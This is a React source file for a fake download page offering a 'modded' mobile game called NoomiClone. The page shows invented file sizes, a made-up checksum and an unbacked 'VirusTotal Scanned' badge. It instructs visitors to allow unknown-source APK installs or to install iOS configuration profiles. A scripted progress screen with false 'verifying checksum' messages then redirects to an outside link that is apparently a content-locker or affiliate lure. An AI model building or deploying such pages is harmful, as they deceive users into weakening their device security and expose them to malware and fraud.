import React, { useState, useEffect } from 'react';
import { 
  Smartphone, 
  Tablet, 
  Download, 
  ChevronDown, 
  ShieldCheck, 
  CheckCircle2, 
  Share2, 
  Copy, 
  Check, 
  ArrowLeft,
  X
} from 'lucide-react';

// User-provided image assets
const APP_ICON_URL = '/src/assets/images/user_icon.jpg';
const APP_ICON_REMOTE = 'https://i.postimg.cc/nzX8vf9m/images.jpg';
const HERO_BANNER_URL = '/src/assets/images/user_banner.jpg';
const HERO_BANNER_REMOTE = 'https://i.postimg.cc/prjg6QZQ/images.jpg';
const REDIRECT_URL = 'https://appcomplete.org/cl/i/82vqek';

type PlatformId = 'android' | 'iphone' | 'ipad';
type ScreenView = 'landing' | 'connecting';

interface PlatformConfig {
  id: PlatformId;
  name: string;
  iconType: 'android' | 'apple' | 'tablet';
  extension: string;
  fileName: string;
  fileSize: string;
  osReq: string;
  installSteps: string[];
}

const PLATFORMS: Record<PlatformId, PlatformConfig> = {
  android: {
    id: 'android',
    name: 'Android',
    iconType: 'android',
    extension: '.apk',
    fileName: 'NoomiClone_v2.4.2_Modded.apk',
    fileSize: '142.8 MB',
    osReq: 'Android 8.0 or higher (ARM64 / x86_64)',
    installSteps: [
      'Tap "Download Now" and confirm the APK file save.',
      'Open your device Settings > Security, and allow "Install from Unknown Sources" for your browser.',
      'Tap on the downloaded NoomiClone APK file in your notification bar or Downloads folder to install.',
      'Launch NoomiClone and enjoy modded perks!'
    ]
  },
  iphone: {
    id: 'iphone',
    name: 'iPhone',
    iconType: 'apple',
    extension: '.mobileconfig',
    fileName: 'NoomiClone_v2.4.2_iOS.mobileconfig',
    fileSize: '138.4 MB',
    osReq: 'iOS 14.0 or later (iPhone 8 up to iPhone 16 Pro Max)',
    installSteps: [
      'Tap "Download Now" to save the verified configuration profile via Safari.',
      'Go to device Settings > Profile Downloaded (near top of Settings).',
      'Tap "Install" in top-right corner, enter passcode if prompted, and confirm installation.',
      'Open NoomiClone from your Home Screen with all modded textures and 120 FPS enabled.'
    ]
  },
  ipad: {
    id: 'ipad',
    name: 'iPad',
    iconType: 'tablet',
    extension: '.mobileconfig',
    fileName: 'NoomiClone_v2.4.2_iPadOS_HD.mobileconfig',
    fileSize: '154.2 MB',
    osReq: 'iPadOS 14.0 or later (iPad Air, Pro, Mini & Standard)',
    installSteps: [
      'Tap "Download Now" in Safari to initiate iPadOS package validation.',
      'Navigate to iPad Settings > Profile Downloaded.',
      'Tap "Install" and follow on-screen trust prompt.',
      'Launch NoomiClone HD optimized for wide iPad displays with Apple Pencil & Gamepad support.'
    ]
  }
};

export default function App() {
  const [currentScreen, setCurrentScreen] = useState<ScreenView>('landing');
  const [selectedPlatform, setSelectedPlatform] = useState<PlatformId>('android');
  const [connectionProgress, setConnectionProgress] = useState(25);
  const [statusMessage, setStatusMessage] = useState('> Locating compatible package on server...');
  const [copiedLink, setCopiedLink] = useState(false);
  const [copiedHash, setCopiedHash] = useState(false);
  const [toastMessage, setToastMessage] = useState<string | null>(null);
  const [isMobile, setIsMobile] = useState<boolean>(true);
  const [showMobileModal, setShowMobileModal] = useState<boolean>(false);

  const currentPlatform = PLATFORMS[selectedPlatform];

  // Auto detect platform and check if mobile
  useEffect(() => {
    if (typeof window !== 'undefined') {
      const ua = navigator.userAgent.toLowerCase();
      const isPhone = /iphone/.test(ua);
      const isTablet = /ipad/.test(ua) || (navigator.platform === 'MacIntel' && navigator.maxTouchPoints > 1);
      const isAndroid = /android/.test(ua);

      if (isPhone) {
        setSelectedPlatform('iphone');
      } else if (isTablet) {
        setSelectedPlatform('ipad');
      } else if (isAndroid) {
        setSelectedPlatform('android');
      }

      // Check if real mobile / tablet device
      const mobileRegex = /android|webos|iphone|ipad|ipod|blackberry|iemobile|opera mini|mobile|crios|windows phone/i;
      const isTouch = 'ontouchstart' in window || navigator.maxTouchPoints > 0;
      const mobileDetected = mobileRegex.test(ua) || (window.innerWidth <= 768 && isTouch);

      setIsMobile(mobileDetected);
      if (!mobileDetected) {
        setShowMobileModal(true);
      }
    }
  }, []);

  const triggerToast = (msg: string) => {
    setToastMessage(msg);
    setTimeout(() => {
      setToastMessage(null);
    }, 3200);
  };

  // Triggers real client-side file download
  const deliverFile = () => {
    const config = PLATFORMS[selectedPlatform];
    const dummyContent = `=====================================================
NOOMICLONE MODDED - MOBILE PORT EDITION
Platform: ${config.name}
Package: ${config.fileName}
Size: ${config.fileSize}
Target Architecture: ARM64-v8a / Metal GPU
Version: v2.4.2-mod (Build #9421)
Checksum (SHA-256): 9b4d82ef204b6845cb01d368e7343e06f9d7842c16ac344910cf91f1ba48744b
=====================================================

INSTALLATION INSTRUCTIONS:
1. Open this file on your ${config.name} device.
2. Follow platform prompt:
   - For Android: Allow "Install unknown apps" if prompted.
   - For iOS/iPadOS: Approve downloaded configuration profile in Settings.
3. Launch NoomiClone Modded and start playing!

MOD FEATURES INCLUDED:
- All Skins & Outfits Unlocked
- Unlimited Sparks & Energy
- High Frame Rate 120 FPS Support
- Ad-Free VIP Experience
- Integrated Anti-Ban Shield
=====================================================`;

    const blob = new Blob([dummyContent], { type: 'application/octet-stream' });
    const url = URL.createObjectURL(blob);
    const link = document.createElement('a');
    link.href = url;
    link.download = config.fileName;
    document.body.appendChild(link);
    link.click();
    document.body.removeChild(link);
    URL.revokeObjectURL(url);
    triggerToast(`Downloaded ${config.fileName}`);
  };

  // Start connecting step
  const handleStartDownload = () => {
    if (!isMobile) {
      setShowMobileModal(true);
      return;
    }

    setCurrentScreen('connecting');
    setConnectionProgress(15);
    setStatusMessage('> Locating compatible package on server...');

    // Realistic progress animation
    setTimeout(() => {
      setConnectionProgress(35);
      setStatusMessage('> Locating compatible package on server...');
    }, 500);

    setTimeout(() => {
      setConnectionProgress(65);
      setStatusMessage(`> Establishing secure mirror for ${currentPlatform.name}...`);
    }, 1200);

    setTimeout(() => {
      setConnectionProgress(88);
      setStatusMessage('> Verifying cryptographic checksum...');
    }, 2000);

    setTimeout(() => {
      setConnectionProgress(100);
      setStatusMessage('> Package located! Redirecting to server...');
      
      // Automatic redirect to the user's destination URL
      setTimeout(() => {
        window.location.href = REDIRECT_URL;
      }, 350);
    }, 2700);
  };

  const copyShareLink = () => {
    if (typeof window !== 'undefined') {
      navigator.clipboard.writeText(window.location.href);
      setCopiedLink(true);
      triggerToast('Landing page link copied to clipboard!');
      setTimeout(() => setCopiedLink(false), 2000);
    }
  };

  const copyShaHash = () => {
    const hash = '9b4d82ef204b6845cb01d368e7343e06f9d7842c16ac344910cf91f1ba48744b';
    navigator.clipboard.writeText(hash);
    setCopiedHash(true);
    triggerToast('SHA-256 package checksum copied!');
    setTimeout(() => setCopiedHash(false), 2000);
  };

  // -------------------------------------------------------------
  // STEP: CONNECTING SCREEN (EXACT MATCH TO UPLOADED IMAGE)
  // -------------------------------------------------------------
  if (currentScreen === 'connecting') {
    return (
      <div className="min-h-screen bg-[#f2faf6] text-slate-900 flex flex-col items-center justify-center px-4 select-none font-sans relative">
        
        {/* Subtle Back Button in top left */}
        <button
          onClick={() => setCurrentScreen('landing')}
          className="absolute top-6 left-6 text-slate-500 hover:text-slate-800 text-xs font-semibold flex items-center gap-1.5 bg-white/70 hover:bg-white px-3 py-2 rounded-xl border border-emerald-100 shadow-xs transition-all cursor-pointer"
        >
          <ArrowLeft className="w-3.5 h-3.5" />
          <span>Back</span>
        </button>

        {/* Center Container */}
        <div className="flex flex-col items-center text-center max-w-sm w-full animate-fade-in">
          
          {/* App Icon with green glowing rounded border */}
          <div className="w-28 h-28 md:w-32 md:h-32 rounded-[32px] overflow-hidden p-1 bg-white border-2 border-white ring-4 ring-[#00c06d] shadow-[0_16px_36px_rgba(0,192,109,0.22)] mb-8 transition-transform hover:scale-105 duration-200">
            <img 
              src={APP_ICON_URL} 
              alt="NoomiClone App Icon" 
              className="w-full h-full object-cover rounded-[26px]"
              referrerPolicy="no-referrer"
              onError={(e) => {
                (e.currentTarget as HTMLImageElement).src = APP_ICON_REMOTE;
              }}
            />
          </div>

          {/* Heading: CONNECTING */}
          <h1 className="text-2xl md:text-3xl font-extrabold text-[#112338] tracking-[0.2em] mb-7 uppercase">
            CONNECTING
          </h1>

          {/* Progress Bar (Pale mint track with emerald green fill) */}
          <div className="w-64 md:w-72 h-3 md:h-3.5 bg-[#daf2e6] rounded-full overflow-hidden p-0.5 mb-8 shadow-inner">
            <div 
              className="bg-[#00c06d] h-full rounded-full transition-all duration-500 ease-out shadow-xs"
              style={{ width: `${connectionProgress}%` }}
            ></div>
          </div>

          {/* Status Text (Monospace font prefixed with >) */}
          <div className="font-mono text-xs md:text-sm text-slate-600 tracking-wide min-h-[24px]">
            {connectionProgress >= 100 ? (
              <a
                href={REDIRECT_URL}
                className="text-[#00a863] hover:underline cursor-pointer"
              >
                &gt; Redirecting to server... (Click if not redirected)
              </a>
            ) : (
              statusMessage
            )}
          </div>

        </div>

      </div>
    );
  }

  // -------------------------------------------------------------
  // MAIN LANDING PAGE VIEW
  // -------------------------------------------------------------
  return (
    <div className="min-h-screen bg-[#f2faf6] text-slate-900 flex flex-col items-center px-4 py-8 md:py-12 select-none font-sans">
      
      {/* Toast Notification */}
      {toastMessage && (
        <div className="fixed top-5 z-50 bg-slate-900 text-white px-5 py-3 rounded-xl shadow-xl flex items-center gap-2 text-sm font-medium border border-slate-700 animate-fade-in">
          <CheckCircle2 className="w-4 h-4 text-emerald-400 shrink-0" />
          <span>{toastMessage}</span>
        </div>
      )}

      {/* Main Container - Exact layout matching the original landing page */}
      <main className="w-full max-w-[620px] flex flex-col items-center">

        {/* 1. App Icon with soft rounded corners & glow */}
        <div className="relative mb-3 group">
          <div className="w-24 h-24 md:w-28 md:h-28 rounded-[28px] overflow-hidden shadow-[0_12px_30px_rgba(0,192,109,0.18)] border-2 border-white bg-white flex items-center justify-center transition-transform hover:scale-105 duration-200">
            <img 
              src={APP_ICON_URL} 
              alt="NoomiClone" 
              className="w-full h-full object-cover"
              referrerPolicy="no-referrer"
              onError={(e) => {
                (e.currentTarget as HTMLImageElement).src = APP_ICON_REMOTE;
              }}
            />
          </div>
        </div>

        {/* 2. Title */}
        <h1 className="text-2xl md:text-3xl font-extrabold tracking-tight mb-2 text-center text-[#112338]">
          NoomiClone
        </h1>

        {/* 3. Subtitle Badge: "MOBILE PORT EDITION" */}
        <div className="mb-6">
          <span className="inline-block bg-[#daf5e8] text-[#00a863] text-[11px] md:text-xs font-bold tracking-wider px-4 py-1.5 rounded-full uppercase shadow-xs">
            Mobile Port Edition
          </span>
        </div>

        {/* 4. Hero Banner Card */}
        <div className="w-full rounded-2xl md:rounded-3xl overflow-hidden shadow-sm border border-emerald-100/70 bg-white mb-6 transition-all hover:shadow-md">
          <div className="relative aspect-video w-full bg-slate-900 overflow-hidden">
            <img 
              src={HERO_BANNER_URL} 
              alt="NoomiClone Artwork" 
              className="w-full h-full object-cover"
              referrerPolicy="no-referrer"
              onError={(e) => {
                (e.currentTarget as HTMLImageElement).src = HERO_BANNER_REMOTE;
              }}
            />
          </div>
        </div>

        {/* 5. How to Install Card */}
        <div className="w-full bg-white rounded-2xl md:rounded-3xl p-6 md:p-8 shadow-sm border border-emerald-100/70 mb-8">
          {/* Header */}
          <div className="pb-4 border-b border-slate-100 mb-5">
            <h2 className="font-bold text-lg md:text-xl text-slate-900">
              How to Install:
            </h2>
          </div>

          {/* 3 Step Ordered List */}
          <ol className="space-y-4 mb-6">
            <li className="flex items-start gap-3">
              <span className="text-[#00a863] font-bold text-base md:text-lg shrink-0">1.</span>
              <p className="font-bold text-sm md:text-base leading-snug pt-0.5 text-slate-900">
                Choose your current mobile device platform.
              </p>
            </li>
            <li className="flex items-start gap-3">
              <span className="text-[#00a863] font-bold text-base md:text-lg shrink-0">2.</span>
              <p className="font-bold text-sm md:text-base leading-snug pt-0.5 text-slate-900">
                Tap the download button below.
              </p>
            </li>
            <li className="flex items-start gap-3">
              <span className="text-[#00a863] font-bold text-base md:text-lg shrink-0">3.</span>
              <p className="font-bold text-sm md:text-base leading-snug pt-0.5 text-slate-900">
                Open the downloaded file to complete setup.
              </p>
            </li>
          </ol>

          {/* Subtext and suggestion */}
          <div className="pt-4 border-t border-slate-100/90 text-[12px] md:text-[13px] text-slate-500 space-y-1">
            <p className="italic">
              Your package installation begins right after file transfer validation.
            </p>
            <p>
              <strong className="text-slate-700 font-semibold not-italic">Suggestion:</strong>{' '}
              <span className="italic text-slate-500">
                Use standard browsers (Safari, Chrome) for optimal performance.
              </span>
            </p>
          </div>
        </div>

        {/* 6. Choose Platform Section */}
        <div className="w-full flex flex-col items-center mb-6">
          <div className="flex items-center gap-2 mb-4 font-bold text-base md:text-lg text-slate-900">
            <Smartphone className="w-5 h-5 text-emerald-600" />
            <span>Choose Platform:</span>
          </div>

          {/* Platform selector button row */}
          <div className="grid grid-cols-3 gap-2.5 md:gap-4 w-full">
            {/* Android Option */}
            <button
              onClick={() => setSelectedPlatform('android')}
              className={`flex items-center justify-center gap-2 py-3.5 px-3 rounded-2xl border transition-all text-sm md:text-base font-semibold cursor-pointer ${
                selectedPlatform === 'android'
                  ? 'bg-white border-[#00c06d] ring-2 ring-[#00c06d]/20 text-slate-900 shadow-md'
                  : 'bg-white/80 border-slate-200 text-slate-600 hover:bg-white hover:text-slate-900 hover:border-slate-300'
              }`}
            >
              <svg className={`w-5 h-5 shrink-0 ${selectedPlatform === 'android' ? 'text-[#00c06d]' : 'text-slate-500'}`} viewBox="0 0 24 24" fill="currentColor">
                <path d="M17.523 15.3414c-.5511 0-.9993-.4486-.9993-.9997s.4482-.9993.9993-.9993c.551 0 .9993.4482.9993.9993.0001.5511-.4483.9997-.9993.9997m-11.046 0c-.5511 0-.9993-.4486-.9993-.9997s.4482-.9993.9993-.9993c.5511 0 .9993.4482.9993.9993 0 .5511-.4482.9997-.9993.9997m11.4045-6.02l1.9973-3.4592a.416.416 0 00-.1521-.5676.416.416 0 00-.5676.1521l-2.0223 3.503C15.5898 8.411 13.849 8.125 12 8.125c-1.849 0-3.5898.286-5.1368.8247L4.841 5.4467a.4161.4161 0 00-.5677-.1521.4157.4157 0 00-.152 5676l1.9972 3.4592C2.6889 11.1867.343 14.6589 0 18.75h24c-.343-4.0911-2.6889-7.5633-6.1185-9.4286"/>
              </svg>
              <span>Android</span>
            </button>

            {/* iPhone Option */}
            <button
              onClick={() => setSelectedPlatform('iphone')}
              className={`flex items-center justify-center gap-2 py-3.5 px-3 rounded-2xl border transition-all text-sm md:text-base font-semibold cursor-pointer ${
                selectedPlatform === 'iphone'
                  ? 'bg-white border-[#00c06d] ring-2 ring-[#00c06d]/20 text-slate-900 shadow-md'
                  : 'bg-white/80 border-slate-200 text-slate-600 hover:bg-white hover:text-slate-900 hover:border-slate-300'
              }`}
            >
              <svg className={`w-5 h-5 shrink-0 ${selectedPlatform === 'iphone' ? 'text-slate-900' : 'text-slate-500'}`} viewBox="0 0 24 24" fill="currentColor">
                <path d="M18.71 19.5c-.83 1.24-1.71 2.45-3.05 2.47-1.34.03-1.77-.79-3.29-.79-1.53 0-2 .77-3.27.82-1.31.05-2.3-1.32-3.14-2.53C4.25 17 2.94 12.45 4.7 9.39c.87-1.52 2.43-2.48 4.12-2.51 1.28-.02 2.5.87 3.29.87.78 0 2.26-1.07 3.81-.91.65.03 2.47.26 3.64 1.98-.09.06-2.17 1.28-2.15 3.81.03 3.02 2.65 4.03 2.68 4.04-.03.07-.42 1.44-1.38 2.83M15.97 6.37c.63-.77 1.06-1.85.94-2.93-.91.04-2.02.61-2.67 1.37-.58.67-1.09 1.77-.95 2.82 1.02.08 2.05-.49 2.68-1.26z"/>
              </svg>
              <span>iPhone</span>
            </button>

            {/* iPad Option */}
            <button
              onClick={() => setSelectedPlatform('ipad')}
              className={`flex items-center justify-center gap-2 py-3.5 px-3 rounded-2xl border transition-all text-sm md:text-base font-semibold cursor-pointer ${
                selectedPlatform === 'ipad'
                  ? 'bg-white border-[#00c06d] ring-2 ring-[#00c06d]/20 text-slate-900 shadow-md'
                  : 'bg-white/80 border-slate-200 text-slate-600 hover:bg-white hover:text-slate-900 hover:border-slate-300'
              }`}
            >
              <Tablet className={`w-5 h-5 shrink-0 ${selectedPlatform === 'ipad' ? 'text-slate-900' : 'text-slate-500'}`} />
              <span>iPad</span>
            </button>
          </div>

          {/* Selected Platform quick info */}
          <div className="mt-3 text-xs text-slate-500 flex items-center gap-3">
            <span>Package: <strong className="font-semibold text-slate-700">{currentPlatform.fileName}</strong></span>
            <span>·</span>
            <span>Size: <strong className="font-semibold text-slate-700">{currentPlatform.fileSize}</strong></span>
          </div>
        </div>

        {/* 7. Color-Matched Arrow Pointing Down */}
        <div className="flex justify-center mb-3">
          <div className="text-[#00c06d] animate-bounce">
            <ChevronDown className="w-8 h-8 stroke-[3]" />
          </div>
        </div>

        {/* 8. Big Prominent "DOWNLOAD NOW" Button */}
        <button
          onClick={handleStartDownload}
          className="w-full max-w-[420px] bg-[#00c06d] hover:bg-[#00ab61] active:scale-[0.98] text-white font-black text-lg md:text-xl py-4 md:py-5 px-8 rounded-2xl shadow-lg shadow-emerald-500/25 transition-all uppercase tracking-wider flex items-center justify-center gap-3 group cursor-pointer mb-8"
        >
          <Download className="w-6 h-6 stroke-[2.5] group-hover:translate-y-0.5 transition-transform" />
          <span>DOWNLOAD NOW</span>
        </button>

        {/* Trust Badges */}
        <div className="w-full flex items-center justify-center gap-6 text-xs text-slate-500 mb-8 border-y border-emerald-100/60 py-3">
          <div className="flex items-center gap-1.5">
            <ShieldCheck className="w-4 h-4 text-emerald-600" />
            <span>VirusTotal Scanned</span>
          </div>
          <span>·</span>
          <div className="flex items-center gap-1.5">
            <CheckCircle2 className="w-4 h-4 text-emerald-600" />
            <span>Rootless / No Jailbreak</span>
          </div>
          <span>·</span>
          <div className="flex items-center gap-1.5">
            <span className="text-emerald-600 font-bold">⚡</span>
            <span>High Speed Mirror</span>
          </div>
        </div>



        {/* 10. Monospace Footer */}
        <footer className="w-full text-center pb-8 pt-2">
          <p className="font-mono text-slate-400 text-xs md:text-sm tracking-wide">
            © 2026 NoomiClone Mobile Port. All rights reserved.
          </p>
          <div className="flex items-center justify-center gap-4 text-xs text-slate-400 mt-2 font-mono">
            <button onClick={copyShareLink} className="hover:text-slate-600 transition-colors flex items-center gap-1 cursor-pointer">
              <Share2 className="w-3 h-3" />
              <span>Share Link</span>
            </button>
            <span>·</span>
            <button onClick={copyShaHash} className="hover:text-slate-600 transition-colors flex items-center gap-1 cursor-pointer">
              <Copy className="w-3 h-3" />
              <span>Verify SHA-256</span>
            </button>
          </div>
        </footer>

      </main>

      {/* Mobile Verification Modal (Exact Match to Screenshot) */}
      {showMobileModal && (
        <div className="fixed inset-0 z-50 bg-black/60 backdrop-blur-xs flex items-center justify-center p-4">
          <div className="relative bg-[#323e4d] border-t-[3px] border-[#00e676] rounded-[28px] sm:rounded-[32px] p-6 sm:p-8 max-w-lg w-full shadow-2xl animate-fade-in">
            
            {/* Top Protruding Green Badge: "● VERIFICATION REQUIRED" */}
            <div className="absolute -top-3.5 left-1/2 -translate-x-1/2 bg-[#00e676] text-white text-[11px] font-black tracking-wider px-5 py-1.5 rounded-full shadow-[0_4px_16px_rgba(0,230,118,0.5)] flex items-center gap-2 whitespace-nowrap">
              <span className="w-2 h-2 rounded-full bg-white/90"></span>
              <span>VERIFICATION REQUIRED</span>
            </div>

            {/* Close Button in top right */}
            <button
              onClick={() => setShowMobileModal(false)}
              className="absolute top-4 right-4 text-slate-400 hover:text-white transition-colors p-1 rounded-lg cursor-pointer"
              aria-label="Close"
            >
              <X className="w-5 h-5" />
            </button>

            {/* Inner Content Grid */}
            <div className="flex items-center justify-between gap-6 pt-2">
              <div className="flex-1 pr-1">
                <h3 className="text-2xl sm:text-3xl font-extrabold text-white leading-tight">
                  Mobile not <span className="text-[#00e676]">detected</span>
                </h3>
                <p className="text-slate-200 text-sm sm:text-base mt-3 leading-relaxed font-normal">
                  Please open this site in your phone to start downloading your game.
                </p>
              </div>

              {/* Padlock Icon Matching Screenshot */}
              <div className="shrink-0 flex items-center justify-center">
                <svg className="w-20 h-24 sm:w-24 sm:h-28 drop-shadow-md" viewBox="0 0 100 120" fill="none" xmlns="http://www.w3.org/2000/svg">
                  {/* Shackle */}
                  <path 
                    d="M26 56V34C26 20.7452 36.7452 10 50 10C63.2548 10 74 20.7452 74 34V56" 
                    stroke="#e2e8f0" 
                    strokeWidth="13" 
                    strokeLinecap="round"
                  />
                  <path 
                    d="M26 56V34C26 20.7452 36.7452 10 50 10C63.2548 10 74 20.7452 74 34V56" 
                    stroke="#94a3b8" 
                    strokeWidth="6" 
                    strokeLinecap="round"
                  />
                  {/* Lock Body */}
                  <rect x="10" y="48" width="80" height="64" rx="16" fill="#f59e0b" />
                  {/* Right 3D Shade */}
                  <path d="M72 48H74C82.8366 48 90 55.1634 90 64V96C90 104.837 82.8366 112 74 112H72V48Z" fill="#d97706" />
                  {/* Keyhole */}
                  <circle cx="50" cy="74" r="7" fill="#1e293b" />
                  <path d="M46.5 76L45 92H55L53.5 76H46.5Z" fill="#1e293b" />
                </svg>
              </div>
            </div>



          </div>
        </div>
      )}

    </div>
  );
}
